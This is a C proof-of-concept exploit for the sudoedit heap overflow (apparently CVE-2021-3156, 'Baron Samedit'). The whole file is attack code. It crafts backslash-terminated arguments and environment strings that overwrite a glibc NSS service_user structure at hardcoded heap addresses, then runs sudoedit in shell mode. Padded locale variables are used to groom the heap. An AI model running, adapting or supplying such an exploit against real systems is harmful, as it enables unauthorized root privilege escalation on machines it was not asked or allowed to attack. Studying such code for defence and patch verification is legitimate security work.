#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define SUDOEDIT_PATH "./bin/sudoedit"
#define TCACHED_CHUNK_START 0x5595e81ef060
#define SERVICE_CHUNK_START 0x5595e81ef230
#define TCACHED_CHUNK_LEN 0xe0
#define ARG_LEN (TCACHED_CHUNK_LEN - 8 - 2)
#define PADDING_LEN ((SERVICE_CHUNK_START - TCACHED_CHUNK_START) - ARG_LEN)
#define OVERWRITE_LEN (48 + 4) /* "X/X\\" */

int main()
{
    char arg[ARG_LEN + 0x10] = {0};
    memset(arg, 0x41, ARG_LEN);
    arg[ARG_LEN - 1] = '\\';

    char padding[PADDING_LEN + 1] = {0};
    memset(padding, 0x41, PADDING_LEN);
    padding[PADDING_LEN - 1] = '\\';

    char* envp[] = {

        padding,
        /* struct service_user* next */
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        /* lookup_actions actions[5] */
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        /* service_library* library */
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        /* void* known */
        "\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
        /* char name[0] */
        "X/X\\",
        "B",

        "LC_NAME=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
"LANG=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
"LC_MONETARY=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",

        NULL,

    };

    char* argv[] = {
        
        "sudoedit",
        "-n", /* non interactive */
        "-s", /* MODE_SHELL */
        arg,
        NULL,

    };

    execve(SUDOEDIT_PATH, argv, envp);

    return 0;
}

